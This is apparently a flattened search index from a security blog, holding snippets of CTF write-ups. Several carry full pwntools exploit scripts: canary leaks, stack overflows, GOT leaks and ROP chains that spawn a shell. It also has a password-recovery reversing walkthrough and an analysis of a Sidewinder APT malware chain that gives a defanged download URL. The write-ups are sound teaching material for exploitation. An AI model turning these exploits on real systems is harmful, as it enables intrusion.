execution of code from that memory region, enhancing security. PIE (Position-Independent Executable) Mitigation: PIE mitigation is disabled in this binary. Consequently, the binary‚Äôs base address is not affected by Address Space Layout Randomization (ASLR). This lack of ASLR protection may have implications for the binary‚Äôs exploitability. Detailed AnalysisOpening binary in Ghidra .Here‚Äôs a breakdown of what the Main function is doing: It initializes several local variables, including a bunch of undefined4 variables (which are essentially 4-byte integers) and a few other variables of different types. It enters a loop using a while (true) construct. Inside this loop, it performs the following actions: It calls a function named print_menu. Which print the menu. It reads two bytes from the standard input into the variable local_8a. It checks if the character represented by local_8a is equal to ‚ÄòF‚Äô. If true, it prompts the user for some data and reads it into local_88. If local_8a is not equal to ‚ÄòF‚Äô, it proceeds to the next while loop. Inside the next while loop, it checks if local_8a is equal to ‚ÄòV‚Äô. If true, it prompts the user for an index, reads it into local_94, and then calls a function named view_account with the address of local_88 and local_94 as arguments. This will Read value from memmory. If local_8a is not equal to ‚ÄòV‚Äô, it proceeds to the next while loop. Inside the third while loop, it checks if local_8a is equal to ‚ÄòE‚Äô. If true, it breaks out of the loop and proceeds to the next section of code. If local_8a is not equal to ‚ÄòE‚Äô, it prints ‚ÄúInvalid choice‚Äù. After exiting the loop, it prompts the user for the size of a name and reads it into local_90. It then prompts the user for a name and reads it into local_48. There is a conditional check if (local_8 != *(int *)(in_GS_OFFSET + 0x14)) which appears to be a stack protection check. If this check fails, it calls __stack_chk_fail() which typically triggers a stack smashing error. Finally, the function returns 0. This is a C function named print_flag that does the following: It calls the system function with the command \"cat ./flag\". The system function is used to execute shell commands. In this case, it‚Äôs running the cat command to display the contents of a file named flag. After executing the command, the function returns. Vulnerability AssessmentThis enables us to perform an out-of-bounds read, thereby allowing us to extract the canary value.By manipulating the number of bytes read in the buffer, we induce a buffer overflow, granting us the ability to redirect code execution towards the ‚Äòprint_flag‚Äô function.FlagExploit Script#!/usr/bin/python3from pwn import *import struct# context.terminal = ['tmux','splitw','-h']os.environ['XDG_CACHE_HOME'] = '/tmp/'context.log_level = 'error'# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''continue'''.format(**locals())exe = './bin'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)libc = elf.libc ; libc_rop = ROP(libc,checksec=False)io = start()canary = b\"0x\"for i in range(131,127,-1):\t\tio.sendlineafter(b\"&gt;\",b\"V\")\tio.sendlineafter(b\"Index : \", str(i))\t\tcanary+=io.recvline().split(b\": \")[1].strip(b\"\\n\")\tfor i in range(12):\t#sleep(1)\tprint(\"Leaking Canary \"+\".\"*i)canary_int=(int(canary,16))print(f\"Leaked Canary : {hex(canary_int)}\")io.sendlineafter(b\"&gt;\",b\"E\")io.sendlineafter(b\"Name Size : \",b\"500\")payload = b\"\"payload += b\"A\"*0x40payload += p32(canary_int)payload += b\"aaaa\" #EBPpayload += p32(elf.sym.print_flag)io.sendlineafter(b\"Name : \",payload)io.interactive()All The Required Files" }, { "title": "CallBack", "url": "/posts/CallBack/", "categories": "Reversing, i386, ctf", "tags": "", "date": "2023-09-10 00:00:00 +0800", "snippet": "In the depths of ‚ÄúCallback,‚Äù an enigmatic 32-bit MZ file, we embarked armed with Pestudio‚Äôs guidance. Strings and imports held no immediate revelations. The enigma remained, shrouded in mystery, urging us to delve deeper. With determination, we pressed on, knowing that every step brought us closer to the heart of the puzzle. The tale of ‚ÄúCallback‚Äù would not remain untold for long.With the binary in motion, a MessageBox emerges, delivering the ominous verdict: ‚ÄúWrong Password.‚Äù It‚Äôs a clear indication that the program is soliciting a password, only to promptly dismiss our initial offering. Somewhere within, a comparison is taking place, and the password‚Äôs true form lies in wait, concealed from our view. Our next step is clear: to uncover the method behind this cryptographic curtain.Back at square one, we find ourselves facing a dynamic MessageBox construction, evading our initial attempts to unravel its secrets. Yet, hope persists.Taking a step back, we turn our gaze towards ‚ÄúWinMain‚Äù, a beacon identified by the astute eyes of IDA. Within its confines may lie the key to our enigma. Like a skilled locksmith, we‚Äôll dissect its inner workings, searching for the threads that tie it to the elusive password check.Though the binary may be compact, its complexity is no less daunting. Armed with determination and a keen eye, we embark on this journey once more, knowing that each line of code is a potential clue leading us closer to the heart of the puzzle. The trail may be obscured, but with every step, we edge closer to revealing the truth hidden within the binary‚Äôs cryptic embrace.In the dim glow of our code, a fragment emerges, revealing a check for the presence of arguments. Like a sentry at the gate, it stands vigilant, ensuring no entry goes unnoticed. This snippet hints at a deeper purpose, a mechanism waiting to be unveiled. Our task now is to decipher its role in the grand scheme of our enigma. if ( *_p___argc() &gt;= 2 &amp;&amp; !byte_655439 &amp;&amp; !byte_655438 )With precision, you‚Äôve identified the pivotal moment when the program decides its course of action. When an argument is absent, it weaves a message to present, showcasing its resourcefulness.Now, as our gaze shifts to the code where arguments are expected, we observe a comparison in progress, each byte meticulously scrutinized against the enigmatic ‚ÄúArglist.‚Äù The strings remain elusive in our static analysis, prompting a choice: do we delve into the intricacies of the function, dissecting the algorithm to unearth the hidden message, or do we employ a more cunning approach?Opting for the latter, we allow the program itself to unfurl the string before us, illuminated in the incisive light of a debugger. This method promises not only efficiency but a real-time glimpse into the construction of the elusive phrase. Armed with this insight, we edge ever closer to unraveling the final layers of our enigma.sub_6515CD(v4, v4, ArgList); LOBYTE(v12) = 0; v5 = 0; while ( (unsigned __int8)ArgList[v5] == (*_p___argv())[1][v5] ) { if ( ++v5 &gt; 16 ) { v6 = (char *)sub_65198C(); if ( v6[24] ) { sub_65164F(24, 0, 13, -268435456); v6[24] = 0; } sub_651BE2(Text, v6, (char)ArgList); flag_______ = sub_651A1C(); if ( *(_BYTE *)(flag_______ + 9) ) { sub_65164F(9, 0, -1431655763, -554766610); *(_BYTE *)(flag_______ + 9) = 0; } MessageBoxA(0, Text, (LPCSTR)flag_______, 0); return 0; } }Armed with the knowledge that the third argument is a pointer to a string array, we set our sights on IDA. With calculated precision, we pinpoint the crucial offset and embed a breakpoint, a sentinel in the code‚Äôs flow.As the program marches forward, we track the changes in the array pointer with a watchful eye. Each shift in value is a breadcrumb, leading us closer to the elusive message. With each iteration, we gather more pieces of the puzzle, steadily illuminating the path forward. The debugger becomes our trusted companion, revealing the intricate dance between code and data, and guiding us towards the heart of the enigma.Armed with the knowledge of the elusive string, ‚Äúf1nding_th3_k3ys‚Äù, we approach the moment of truth. With unwavering determination, we present this ciphered key as our offering.As the code commences its evaluation, each character is inspected, scrutinized for a match. The dance between our input and the hidden message unfolds, a symphony of bytes and bits. In this decisive moment, the digital realm holds its breath.And then, a revelation. The strings converge in harmony, the verdict rendered. It is a triumph, a testament to our persistence and cunning. The gates of the enigma begin to creak open, revealing the treasures within. With the key in hand, we stand on the threshold of victory, poised to unravel the final layers of this cryptographic tapestry.With the correct password in hand, we stand at the brink of triumph. As we feed it to the program, the final pieces of the puzzle fall into place. Like a lock yielding to the perfect key, the enigma relents, revealing its most coveted secret.And there it is, in bold digital proclamation: ‚ÄúTurnout The key is the Flag.‚Äù The answer, once hidden in the depths of the code, now stands before us, a testament to our perseverance and ingenuity.With the flag in hand, we emerge from this digital labyrinth, victorious. The enigma, once impenetrable, has yielded its treasure. This journey through the realms of reversing has not only honed our skills but reaffirmed the boundless potential of the digital frontier. Armed with knowledge and resolve, we turn our gaze to the next challenge, ready to conquer whatever enigma lies in wait.All The Required Files" }, { "title": "Decoding Sidewinder APT Malware", "url": "/posts/eeeb99f94029fd366dcde7da2a75a849833c5f5932d8f1412a89ca15b9e9ebb7/", "categories": "Malware, win, Apt, CVE-2017-0199", "tags": "", "date": "2023-08-02 00:00:00 +0800", "snippet": "First Stage: The initial phase involves a malicious document programmed to download an RTF file from the following URL: ‚Äúhxxps://dgmp-paknavy.mod-pk[.]com/14325/1/10/2/0/0/0/m/files-5291bef6/file[.]rtf‚Äù.Second Stage: The downloaded file, file.rtf, contains CVE-2017-0199, a vulnerability in Microsoft Word that enables attackers to execute a malicious Visual Basic script. This flaw grants them the ability to execute embedded JavaScript within RTF stream 0.extracting stream 0 from rtfExtracted JavaScript in its obfuscated state.After the code has been cleaned, it appears something like this.This function primarily checks for an available .NET compiler and then generates a path to ‚Äòcsc.exe‚Äô for on-the-fly compilation of C# code to evade detection. However, it was not utilized in this sample, leading us to hypothesize that the code may be reused or could be employed in an upcoming campaign.In this sample, the code begins by checking for the installed antivirus software using ‚Äúwingmts.‚Äù Simultaneously, it decodes base64 content, extracting a DLL (confirmed after analyzing the PE file) from it. Subsequently, the extracted DLL is loaded into the process. The code then appends the antivirus name to a URL before invoking ‚ÄúProgram.work‚Äù from the loaded DLL library, passing the combined URL and antivirus name as parameters to the function.Decrypting Base64Ectracting dll from base64 . Upon opening the file in PE Studio to familiarize myself with its content, certain indicators immediately suggest that it is a DLL and likely a .NET binary.The next step is to check its exported functions.Opening dll in DnspyAfter opening the DLL and performing cleanup, we can observe that the initial section gathers information about installed antivirus programs. Specifically, it checks for Avast, Avira, and AVG. If any of these antivirus programs are detected, the DLL proceeds to execute a file. This file contains a Base64 payload that is passed to it by the parent process. The payload is then formatted and written to a file, utilizing ‚Äúmshta.exe‚Äù as a means of evading detection.On the other hand, if a different antivirus program is found during the check, the file content is simply used to start a process. However, in this particular case, this part of the program remains unused.This particular segment of the code is actively utilized in this case. It involves the receipt of a URL parameter passed by the parent process. Subsequently, the DLL leverages this URL to fetch a payload, which is then stored in an array. The payload is formatted accordingly and subsequently executed as a separate process.In the event that the process creation encounters any issues or fails for some reason, the DLL is designed to handle the exception (reason for the crash). It captures the relevant exception data and sends it back to the original URL in a specific format, making it recognizable and processable on the server side. Additionally, the DLL takes the necessary step to terminate the problematic process.Overall, this functionality allows the code to dynamically retrieve and execute payloads from the provided URL while effectively handling errors and reporting them back to the server for further analysis.Indeed, it seems that the third stage of the code was promptly removed upon being reported, leading to no success in retrieving it. As a result, access to the content and functionalities of the third stage remains elusive. The removal of the third stage can be seen as a defensive measure taken by the developers to prevent further analysis or detection of their code‚Äôs full capabilities.In such cases, it becomes challenging to gain a comprehensive understanding of the entire code‚Äôs behavior and intended purpose.IOC :eeeb99f94029fd366dcde7da2a75a849833c5f5932d8f1412a89ca15b9e9ebb7All The Required Files" }, { "title": "Weird Cookie , NahamCon 2023", "url": "/posts/Weird_Cookie_nahamcon_2023/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2023-06-19 00:00:00 +0800", "snippet": "Description :it appears that there is a global variable that holds a canary value, and the same canary value is stored on the stack. It‚Äôs important to note that these hardcoded canary values vary if Address Space Layout Randomization (ASLR) is enabled.The program allocates 40 bytes of memory on the stack, which are initialized to zero. However, when the program takes input from the user, it accepts 64 bytes of data and saves it in the 40-byte stack-allocated memory, causing a buffer overflow. Subsequently, the contents of this memory are printed to the screen as a string.Afterward, the program accepts another input, which also leads to a buffer overflow. This buffer overflow allows the manipulation of the program‚Äôs control flow, specifically the instruction pointer (RIP) and the base pointer (RBP).The attack strategy involves leaking values from the stack by inspecting it. By overflowing null byte ‚Äò\\x00‚Äô and using the puts function, we can print everything until the next null byte ‚Äò\\x00‚Äô. This allows us to leak values from memory, including the canary value and ‚ÄòIO_2_1_stdout‚Äô. These leaked values help us bypass canary and PIE (Position Independent Executable) protections.In the subsequent buffer overflow, we overwrite the base pointer (RBP) with a Global Offset Table (GOT) address and the return instruction pointer (RIP) with the address of the main function plus an offset of 112. This enables us to leak the contents of the GOT, revealing addresses of functions in the libc library. We can then utilize the libc address plus the 0x10a2fc onegadget offset to gain a shell.Protections:Vulnerable CodeExploit#!/usr/bin/python3from pwn import *import struct# context.terminal = ['tmux','splitw','-h']os.environ['XDG_CACHE_HOME'] = '/tmp/'context.log_level = 'error'# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *main+221continuecontinue'''.format(**locals())exe = './weird_cookie'elf = context.binary = ELF(exe, checksec=False)libc = elf.libclibc_rop = ROP(libc, checksec=False)io = start()padd = 40# Initial payload to trigger overflowpayload = b\"\"payload += b\"A\" * paddio.sendafter(b\"Do you think you can overflow me?\\n\", payload)io.recvuntil(b\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\")# Leak the canary and PIE addressleak_raw = io.recvline().strip(b\"\\n\")leak_canary = u64(leak_raw[0:8])leak_pie = u64(leak_raw[8:14] + b\"\\x00\" * 2)print(f\"Leaked PIE value: {hex(leak_pie)}\")print(f\"Leaked canary: {hex(leak_canary)}\")# Calculate the base address of the binary using the leaked PIE valueelf.address = leak_pie - elf.sym.__libc_csu_init# Save the leaked canary valuecanary = leak_canaryexe_rop = ROP(elf, checksec=False)# Prepare the payload for the second stage of the attackpayload1 = b\"\"payload1 += b\"A\" * paddpayload1 += p64(canary)payload1 += p64(elf.got.exit + 0x30 + 16 + 8) # rsp = [rbp-0x30] # rbp (exit+16 = io_stdin)payload1 += p64(elf.sym.main + 112) # RIPio.sendafter(b\"Are you sure you overflowed it right? Try again.\\n\", payload1)# Leak the address of exit from the GOTleak_got_exit = u64(io.recvline().strip(b\"\\n\") + b\"\\x00\" * 2)# Calculate the base address of libc using the leaked GOT addresslibc.address = leak_got_exit - libc.sym._IO_2_1_stdout_print(hex(leak_got_exit))print(hex(libc.address + 0x4f2a5))# Prepare the final payload for the third stage of the attackpayload1 = b\"\"payload1 += b\"A\" * 56payload1 += p64(libc.address + 0x10a2fc)io.sendafter(b\"Are you sure you overflowed it right? Try again.\\n\", payload1)# Switch to interactive mode to interact with the exploited binaryio.interactive()Note: Due to time constraints, I decided not to pursue the exploit further as it didn‚Äôt work on my system, although it worked successfully on a remote system." }, { "title": "Open Seasame , NahamCon 2023", "url": "/posts/Open_Seasame_nahamcon_2023/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2023-06-19 00:00:00 +0800", "snippet": "Description :The updated program prompts the user to enter a password to open a simulated cave of gold. In addition to entering the correct password, the boolean variable caveCanOpen must also be set to yes for the cave to open. If both conditions are met, the program displays a success message, executes a system command to reveal the contents of the ‚Äòflag.txt‚Äô file (the treasure), and terminates. If the password is incorrect or the caveCanOpen variable is not set to yes, the program displays an error message or exits. The given program does not enforce any length limit on the user input, making it vulnerable to buffer overflow attacks. An attacker could potentially craft a payload by appending the correct password followed by a null byte to terminate the string, and then provide a large amount of junk values to override the caveCanOpen variable on the stack. By doing so, the attacker can bypass the check for caveCanOpen == no and proceed to the password validation step. This can lead to unauthorized access to the cave‚Äôs treasure flag.txtProtection:Vulnerable Code:#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;typedef enum {no, yes} Bool;void flushBuffers() { fflush(NULL);}void flag(){ system(\"/bin/cat flag.txt\"); flushBuffers();}Bool isPasswordCorrect(char *input){ return (strncmp(input, \"OpenSesame!!!\", strlen(\"OpenSesame!!!\")) == 0) ? yes : no;}void caveOfGold(){ Bool caveCanOpen = no; char inputPass[256]; puts(\"BEHOLD THE CAVE OF GOLD\\n\"); puts(\"What is the magic enchantment that opens the mouth of the cave?\"); flushBuffers(); scanf(\"%s\", inputPass); if (caveCanOpen == no) { puts(\"Sorry, the cave will not open right now!\"); flushBuffers(); return; } if (isPasswordCorrect(inputPass) == yes) { puts(\"YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:\"); flag(); } else { puts(\"ERROR, INCORRECT PASSWORD!\"); flushBuffers(); }}int main(){ setbuf(stdin, NULL); setbuf(stdout, NULL); caveOfGold(); return 0;}Exploit:#!/usr/bin/python3from pwn import *import struct# Set the log level to control the verbosity of logscontext.log_level = 'error'# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *isPasswordCorrectcontinue'''.format(**locals())# Set the path to the binaryexe = './open_sesame'elf = context.binary = ELF(exe, checksec=False)exe_rop = ROP(elf, checksec=False)# Get the libc librarylibc = elf.libclibc_rop = ROP(libc, checksec=False)# Start the processio = start()# Set the padding sizepadd = 280# Create the payloadpayload = b\"A\" * paddpayload += b\"B\" * 6payload = b\"OpenSesame!!!\\x00aaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa\"# Send the payload to the target binaryio.sendlineafter(b\"What is the magic enchantment that opens the mouth of the cave?\\n\", payload)# Switch to interactive mode to interact with the exploited binaryio.interactive()" }, { "title": "All Patched Up , NahamCon 2023", "url": "/posts/all_patched_up_nahamcon_2023/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2023-06-18 00:00:00 +0800", "snippet": "Purpose : Get The FlagUnleashing the ROP Chain and Hijacking the GOTVulnerable CodeProtectionExploit#!/usr/bin/python3from pwn import *import struct# context.terminal = ['tmux','splitw','-h']os.environ['XDG_CACHE_HOME'] = '/tmp/'context.log_level = 'error'# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *main+68continuecontinue'''.format(**locals())exe = './bin'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)libc = elf.libc ; io = start()padd = 520pop_rsi_r15 = 0x0000000000401251payload = b\"\"payload += b\"A\"*paddpayload += p64(pop_rsi_r15) # saved rippayload += p64(elf.got.write) # pop rsipayload += p64(0x4242424242424242) # pop r15payload += p64(elf.plt.write) # executing pltpayload += p64(elf.sym.main) # redirecting the flow back to mainio.sendlineafter(b\"&gt;\",payload)\"\"\" Leaking got table \"\"\"leak_got_raw=io.recvuntil(b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")\"\"\" Formating it to get read address \"\"\"leak_got_read = u64( leak_got_raw.split(b\"\\x00\")[4] + b\"\\x00\"*(2) )print(f\"Leaked Read GOT : {hex(leak_got_read)}\")\"\"\" Finding libc base address by subtracting read offset \"\"\"libc.address = leak_got_read - libc.sym.readprint(f\"Libc Base Address : {hex(libc.address)}\")libc_rop = ROP(libc,checksec=False) # Building for rop chain with new libc basepop_rdi = 0x0000000000023b6a payload1 = b\"\"payload1 += b\"A\"*paddpayload1 += p64(libc.address + pop_rdi ) # rippayload1 += p64(next(libc.search(b\"/bin/sh\")))payload1 += p64(libc.symbols['system'])io.sendlineafter(b\"&gt;\",payload1)io.interactive()" }, { "title": "Nahm , NahamCon 2023", "url": "/posts/Nahm_nahamcon_2023/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2023-06-18 00:00:00 +0800", "snippet": "Description :The program is designed to work with a specific file. First, it prompts the user to enter the name of the file. If the file name matches the keyword ‚Äúflag,‚Äù the program terminates immediately. Otherwise, it proceeds to check the properties of the file. If the file is a symlink, an error is thrown indicating that it is a symlink file.Next, the program verifies if the file size is less than 81 bytes. If the file size meets this condition, the program waits for user input. Once the user provides input, a function is executed to open the file and copy 4096 bytes into a buffer of 80 bytes, creating a potential buffer overflow situation.To exploit this vulnerability, you can create a file with a size less than 80 bytes and wait until the program prompts for user input. At this point, you can add exploit code to the file, making sure it exceeds 80 bytes. Since no further checks are performed, the exploit code can grant you shell access.Vulnerable CodeProtectionExploit:#!/usr/bin/python3from pwn import *import struct# Set the log level to control the verbosity of logscontext.log_level = 'error'# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *vuln+109continue'''.format(**locals())# Define the path to the binaryexe = './bin'elf = context.binary = ELF(exe, checksec=False)# Create a payload for the exploitpayload = b\"\"payload += b\"A\"*80# Write the payload to a file (function definition not provided)write(\"1\", payload)# Start the processio = start()# Define the file path to send to the target binaryfile_path = b\"1\" # For remote server, use \"/tmp/1\"# Send the file path to the target binaryio.sendlineafter(b\"Enter file: \", file_path)# Create another payload for the exploitpayload = b\"\"payload += b\"A\"*104payload += p64(elf.sym.winning_function)# Write the payload to a filewrite(\"1\", payload) # For remote servers, use \"/tmp/1\" due to write permission in the home folder# Send a newline character to the target binaryio.sendline()# Switch to interactive mode to interact with the exploited binaryio.interactive()" }, { "title": "Exploiting Seccomp-Restricted Program to Leak a Flag", "url": "/posts/Bsides_challenge_1/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2023-06-09 00:00:00 +0800", "snippet": "Purpose : Get The FlagIntroduction: The purpose of this write-up is to explain the process of exploiting a seccomp-restricted program to leak a secret. Seccomp is a mechanism in Linux that restricts the system calls a program can make, providing an additional layer of security. The code provided demonstrates the use of seccomp to restrict the program to only two syscalls: read and exit_group. By leveraging these restrictions and reading one byte at a time, we can gradually leak the secret stored in the program‚Äôs memory.Exploit Strategy: To exploit the vulnerability, we need to leak the secret byte by byte. Since the program restricts the syscalls to read and exit_group, we cannot directly leak the secret using the printf function or other standard output methods. Instead, we can use the exit_group syscall to read the secret directly from memory. By continuously invoking the exit_group syscall with a secret variable pointer as first argument which leaked one byte with exit code that consists of byte in numeric form on every prgram exit , we can gradually leak the secret on .Vuln Code#define _DEFAULT_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/fcntl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;#include &lt;linux/audit.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;#define CHECK(B) do { if(!(B)) exit(1); } while(0)char secret[0x100];int init_seccomp();void init() { int fd; // setting stdout and stdin to be unbuffered setvbuf(stdout,0,_IONBF,0); setvbuf(stdin,0,_IONBF,0); // load the secret fd = open(\"secret.txt\", O_RDONLY); read(fd, &amp;secret, sizeof(secret)); close(fd);}int main(){ char *code; init(); printf(\"Welcome to \\033[1;32mRCEaaS\\033[0m\\n\"); code = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0); read(0, code, 0x1000); if (strcmp(secret, code)) { CHECK(!fclose(stdout)); CHECK(!fclose(stderr)); CHECK(!init_seccomp()); } else printf(\"You seem trustworthy!\\n\"); ((void (*)(void)) code) ();}int init_seccomp(){#define ALLOW(NR) \\ BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, (NR), 0, 1), \\ BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW) \\ struct sock_filter filter[] = { BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, arch)), BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, AUDIT_ARCH_X86_64, 1, 0), BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL), BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, nr)), ALLOW(SYS_read), ALLOW(SYS_exit_group), BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL), };#undef ALLOW struct sock_fprog prog = { .len = sizeof(filter) / sizeof(*filter), .filter = filter, }; return prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) || prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);}ExploitFirst Exploit.py#!/usr/bin/python3from pwn import *import struct# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *mainbreak *main+159continue'''.format(**locals())exe = './vuln'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)secret = 0x404060for i in range(256):\t\ttry:\t\tio = start()\t\tpayload = asm(f\"\"\"nop\t\tmov rsi , {secret+i}\t\tmov rdi, [rsi]\t\tmov rax,231 /* read syscall number */\t\tsyscall\t\t\"\"\")\t\tio.sendlineafter(b'Welcome to \\033[1;32mRCEaaS\\033[0m\\n', payload)\t\tio.recvline()\t\tprint(success())\texcept EOFError:\t\tpassprint(Progress.success())Second Exploit.py#!/usr/bin/python3from pwn import *temp_code = [0] * 256temp_pid= [0] * 256with open('/tmp/code.txt') as code:\twith open('/tmp/pid_sort.txt') as pid:\t\tfor i in range (256):\t\t\ttemp_code[i] = code.readline().strip(\"\\n\")\t\t\ttemp_pid[i] = pid.readline().strip(\"\\n\")\t\t\t\tfor i in range(256):\t\t\tfor j in range(256):\t\t\t\tif temp_code[j].split(\"(pid \")[1].strip(\")\\n\") == temp_pid[i]:\t\t\t\t\tchr_int = temp_code[j].replace(\"[*] Process './vuln' stopped with exit code \",\"\").split(\" \")[0]\t\t\t\t\tprint(chr(int(chr_int)),end=\"\")\t\tprint(\"\\n\")Third Exploit.sh#!/bin/bashpython3 first.py | tee /tmp/exit_code.txtcat /tmp/exit_code.txt |grep \"stopped with exit code\" | tee /tmp/code.txt cat /tmp/exit_code.txt | grep \"exit\" |cut -d \"(\" -f 2 | sort | cut -d \" \" -f 2 | cut -d \")\" -f 1 | tee /tmp/pid_sort.txt#clearecho \"Content of Secret.txt\"python3 second.pyrm /tmp/*.txtAfter Writing this i was known that exit code can be recoded directly Thank @zeeshan.from pwn import *context.arch = \"amd64\"def gen(i, flag): payload = asm(f\"\"\" mov rsp, {flag+i} xor rdi, rdi mov dil, byte ptr [rsp] {shellcraft.exit_group(\"rdi\")} \"\"\") return payloadchar = \"\"exit_code = 0flag = 0x404060for i in range(30): io = process([\"./vuln\"], close_fds=False) payload = gen(i, flag) io.sendlineafter(b'Welcome to \\033[1;32mRCEaaS\\033[0m\\n', payload) exit_code = io.poll(True) if exit_code &lt; 20: log.info(f\"non ascii encountered, exiting...\") exit(0) char += bytes.fromhex(hex(exit_code)[2:]).decode('ASCII') info(f\"flag is {char}\") io.close()" }, { "title": "knock_neighbout , NahamCon 2023", "url": "/posts/knock_neighbour_puctf_2023/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2023-06-05 00:00:00 +0800", "snippet": "Description:The program generates a random value at runtime using the current time as the seed. It then prompts the user for input and compares it to the previously generated random value. If the user‚Äôs input matches the generated value, the program prints the flag; otherwise, it terminates.The vulnerability lies in the random value generation seed, which is based on the current time. To complete this challenge, you can create a program that generates the same random value by using the same seed (current time) at the exact moment the target program is executed. By sending this pre-generated value to the program, you can bypass the check and obtain the flag.ProtectionsVulnerable CodeExploit#!/usr/bin/python3from pwn import *import structimport randomfrom ctypes import *# context.terminal = ['tmux','splitw','-h']os.environ['XDG_CACHE_HOME'] = '/tmp/'context.log_level = 'error'# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *main+301continue'''.format(**locals())# Create bytearrays for the buffer and a temporary variablebuff = bytearray(0x3f)temp_2 = bytearray(0x3f)exe = './knock_neighbour'elf = context.binary = ELF(exe, checksec=False)exe_rop = ROP(elf, checksec=False)libc = elf.libclibc_rop = ROP(libc, checksec=False)io = start()# Load the libc library and get the current timelibc = cdll.LoadLibrary('libc.so.6')time_1 = libc.time(0x0)libc.srand(time_1)# Generate random numbers and fill the buffersfor i in range(0x3f): temp = libc.rand() bVar1 = (temp &gt;&gt; 0x1f) buff[i] = (temp + (bVar1 &gt;&gt; 1) &amp; 0x7f) - (bVar1 &gt;&gt; 1) temp_2[i] = buff[i]padd = 104# Set the payload as the generated bufferpayload = temp_2# Send the first inputio.sendlineafter(b\"Give me your lucky number:\\n\", b\"1\")# Send the payload as the second inputio.sendafter(b\"Give me your wish:\\n\", payload)# Switch to interactive mode to interact with the exploited binaryio.interactive()" }, { "title": "Little Hero Khi Qualifier 2022", "url": "/posts/little_hero_hacktathon_khi_qualifying_2022/", "categories": "Reversing, Dotnet, ctf", "tags": "", 